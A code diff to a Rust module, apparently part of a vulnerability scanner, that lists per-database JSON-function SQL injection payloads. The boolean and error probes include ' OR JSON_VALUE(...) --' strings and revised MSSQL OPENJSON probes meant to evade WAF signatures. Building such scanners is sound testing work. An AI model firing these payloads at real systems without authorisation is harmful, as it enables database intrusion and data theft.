@@ -1,10 +1,10 @@
 #![deny(unsafe_code)]
 
-//! JSON-function SQLi payloads per DBMS.
+//! JSON-function `SQLi` payloads per DBMS.
 //!
 //! Apps storing JSON (configs, preferences, API blobs) often splice user input
 //! into `JSON_EXTRACT` / `->>` / `JSON_VALUE` expressions. A quote break-out
-//! there behaves like classic SQLi but signature WAFs tuned for `OR 1=1` can
+//! there behaves like classic `SQLi` but signature WAFs tuned for `OR 1=1` can
 //! miss the JSON context — hence dedicated boolean + error probes.
 //!
 //! Each [`JsonPayload`] carries a TRUE/FALSE boolean pair plus one error
@@ -19,6 +19,10 @@
 /// Chosen to be invalid JSON on every DBMS while remaining a plausible probe
 /// body; integration mocks key off it to return per-DBMS error text.
 pub const BAD_DOC: &str = "__bad__";
+
+/// MSSQL's `JSON_VALUE` returns NULL on invalid JSON rather than raising an error.
+/// Use OPENJSON with explicit schema validation for error-based detection.
+const MSSQL_BAD_DOC_OPENJSON: &str = "'__bad__'";
 
 #[derive(Debug, Clone)]
 #[non_exhaustive]
@@ -81,13 +85,17 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
             JsonPayload::new(
                 "' OR JSON_VALUE('{\"k\":1}','$.k')='1' --",
                 "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
-                format!("' AND JSON_VALUE('{BAD_DOC}','$.k')='1' --"),
+                // JSON_VALUE returns NULL on invalid input; use OPENJSON for error-based detection.
+                format!(
+                    "' AND (SELECT value FROM OPENJSON({MSSQL_BAD_DOC_OPENJSON}) WITH (k int '$.k'))='1' --"
+                ),
                 "mssql",
             ),
             JsonPayload::new(
                 "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='1' --",
                 "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='2' --",
-                format!("' AND (SELECT value FROM OPENJSON('{BAD_DOC}'))='1' --"),
+                // Strict OPENJSON: invalid JSON raises "JSON text is not properly formatted"
+                format!("' AND (SELECT * FROM OPENJSON({MSSQL_BAD_DOC_OPENJSON}))='1' --"),
                 "mssql",
             ),
         ],
